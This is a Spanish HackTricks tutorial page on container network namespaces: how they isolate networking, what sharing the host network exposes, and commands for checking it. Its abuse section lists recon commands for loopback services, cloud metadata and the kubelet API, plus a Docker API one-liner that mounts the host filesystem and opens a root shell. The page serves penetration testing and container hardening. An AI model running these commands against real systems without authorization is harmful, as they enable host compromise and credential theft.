# Espacio de nombres de red

{{#include ../../../../../banners/hacktricks-training.md}}

## Descripción general

El espacio de nombres de red aísla recursos relacionados con la red como interfaces, direcciones IP, tablas de enrutamiento, estado ARP/neighbor, reglas de firewall, sockets y el contenido de archivos como `/proc/net`. Por eso un contenedor puede tener lo que parece su propio `eth0`, sus propias rutas locales y su propio dispositivo loopback sin poseer la pila de red real del host.

Desde el punto de vista de la seguridad, esto importa porque el aislamiento de red es mucho más que la vinculación de puertos. Un espacio de nombres de red privado limita lo que la carga de trabajo puede observar o reconfigurar directamente. Una vez que ese espacio de nombres se comparte con el host, el contenedor puede de repente ganar visibilidad sobre listeners del host, servicios locales del host y puntos de control de red que nunca debieron exponerse a la aplicación.

## Funcionamiento

Un espacio de nombres de red recién creado comienza con un entorno de red vacío o casi vacío hasta que se le adjuntan interfaces. Los runtimes de contenedores entonces crean o conectan interfaces virtuales, asignan direcciones y configuran rutas para que la carga de trabajo tenga la conectividad esperada. En implementaciones basadas en puente, esto normalmente significa que el contenedor ve una interfaz respaldada por veth conectada a un puente del host. En Kubernetes, los CNI plugins se encargan de la configuración equivalente para la red de los Pod.

Esta arquitectura explica por qué `--network=host` o `hostNetwork: true` supone un cambio tan drástico. En lugar de recibir una pila de red privada preparada, la carga de trabajo se une a la pila real del host.

## Laboratorio

Puedes ver un espacio de nombres de red casi vacío con:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Y puedes comparar contenedores normales y contenedores con la red del host con:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
El contenedor conectado a la red del host ya no tiene su propia vista aislada de sockets e interfaces. Ese cambio por sí solo ya es significativo antes de que siquiera preguntes qué capacidades tiene el proceso.

## Uso en tiempo de ejecución

Docker y Podman normalmente crean un espacio de nombres de red privado para cada contenedor a menos que se configuren de otra manera. Kubernetes suele dar a cada Pod su propio espacio de nombres de red, compartido por los contenedores dentro de ese Pod pero separado del host. Incus/LXC también proporcionan un aislamiento basado en espacios de nombres de red, a menudo con una mayor variedad de configuraciones de red virtual.

El principio común es que la red privada es el límite de aislamiento predeterminado, mientras que usar la red del host es una exclusión explícita de ese límite.

## Errores de configuración

La mala configuración más importante es simplemente compartir el espacio de nombres de red del host. A veces se hace por rendimiento, monitorización a bajo nivel o conveniencia, pero elimina uno de los límites más limpios disponibles para los contenedores. Los servicios que escuchan localmente en el host pasan a ser accesibles de forma más directa, los servicios accesibles solo por localhost pueden volverse accesibles, y capacidades como `CAP_NET_ADMIN` o `CAP_NET_RAW` se vuelven mucho más peligrosas porque las operaciones que habilitan ahora se aplican al propio entorno de red del host.

Otro problema es otorgar en exceso capacidades relacionadas con la red incluso cuando el espacio de nombres de red es privado. Un espacio de nombres privado ayuda, pero no hace que los raw sockets o el control de red avanzado sean inofensivos.

## Abuso

En configuraciones con aislamiento débil, los atacantes pueden inspeccionar los servicios que escuchan en el host, alcanzar endpoints de gestión ligados solo al loopback, sniffear o interferir con el tráfico dependiendo de las capacidades y el entorno, o reconfigurar el enrutamiento y el estado del firewall si `CAP_NET_ADMIN` está presente. En un clúster, esto también puede facilitar el movimiento lateral y el reconocimiento del plano de control.

Si sospechas que se está usando la red del host, empieza por confirmar que las interfaces y los listeners visibles pertenecen al host en lugar de a una red aislada del contenedor:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Los loopback-only services suelen ser el primer hallazgo interesante:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Si están presentes las capacidades de red, prueba si el workload puede inspeccionar o alterar la pila visible:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
En entornos de cluster o cloud, la red del host también justifica un recon local rápido de metadata y servicios adyacentes al control-plane:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Ejemplo completo: Host Networking + Local Runtime / Kubelet Access

Host networking no proporciona automáticamente acceso root al host, pero a menudo expone servicios que están intencionalmente accesibles solo desde el propio nodo. Si uno de esos servicios está débilmente protegido, host networking se convierte en una vía directa de privilege-escalation.

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet en localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impacto:

- compromiso directo del host si una API de runtime local está expuesta sin la protección adecuada
- reconocimiento del cluster o lateral movement si kubelet o agentes locales son accesibles
- manipulación del tráfico o denegación de servicio cuando se combina con `CAP_NET_ADMIN`

## Comprobaciones

El objetivo de estas comprobaciones es saber si el proceso tiene una pila de red privada, qué rutas y listeners son visibles y si la vista de red ya se asemeja a la del host antes incluso de probar las capacidades.
```bash
readlink /proc/self/ns/net   # Network namespace identifier
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
Lo interesante aquí:

- Si el identificador del namespace o el conjunto de interfaces visibles se parecen a los del host, host networking podría ya estar en uso.
- `ss -lntup` es especialmente valioso porque revela listeners solo en loopback y endpoints de gestión locales.
- Las rutas, los nombres de interfaz y el contexto del firewall cobran mucha más importancia si `CAP_NET_ADMIN` o `CAP_NET_RAW` están presentes.

Al revisar un contenedor, evalúa siempre el network namespace junto con el conjunto de capacidades. Host networking más capacidades de red potentes es una postura muy distinta a bridge networking más un conjunto de capacidades por defecto limitado.
{{#include ../../../../../banners/hacktricks-training.md}}
